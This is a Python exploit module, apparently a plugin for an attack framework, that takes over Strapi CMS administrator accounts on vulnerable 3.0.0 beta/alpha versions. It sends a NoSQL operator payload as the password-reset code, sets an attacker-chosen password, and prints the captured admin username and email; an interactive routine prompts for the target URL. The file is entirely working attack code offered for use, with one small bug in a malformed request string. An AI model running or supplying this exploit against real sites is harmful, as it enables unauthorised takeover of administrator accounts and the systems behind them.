from strapi_plugin import StrapiExploitInterface
import requests
from json import JSONDecodeError

class CVE2019_1881(StrapiExploitInterface):
    def __init__(self):
        super().__init__("Strapi-CVE-2019-1881", "Unauthenticated Password Reset Vulnerability / Privilege Escalation")
    def check_if_vulnerable(self, version: str) -> bool:
        '''Check if the Strapi instance is vulnerable.'''
        if version.startswith('3.0.0-beta') or version.startswith('3.0.0-alpha'):
            return True
        return False
    def exploit(self, url: str, email: str, password: str) -> bool:
        '''Exploit the vulnerability.'''
        params = {
            "code": {"$gt":0},
            "password": password,
            "passwordConfirmation": password
        }
        payload = {"email": email, "url":f"{url}/admin/plugins/users-permissions/auth/reset-password"}
        requests.post("{url}/", json=payload)
        try:
            r = requests.post(f"{url}/admin/auth/reset-password", json=params).json()
            if "jwt" not in r:
                return False
            print(f"[ + ] Password reset successfull.\nUsername: {r['user']['username']}\nEmail: {r['user']['email']}\nPassword: {password}")
            return True
        except JSONDecodeError:
            return False
    def run(self) -> bool:
        url = input("Enter the URL of the Strapi instance: ")
        if url.endswith("/"):
            url = url[:-1]
        version = self.get_strapi_version(url)
        if not self.check_if_vulnerable(version):
            print(f"[!] Strapi version {version} is not vulnerable.")
            return True
        email = input("[+] Admin email: ")
        password = input("[+] Enter the new password: ")
        self.exploit(url, email, password)

def init():
    return CVE2019_1881()
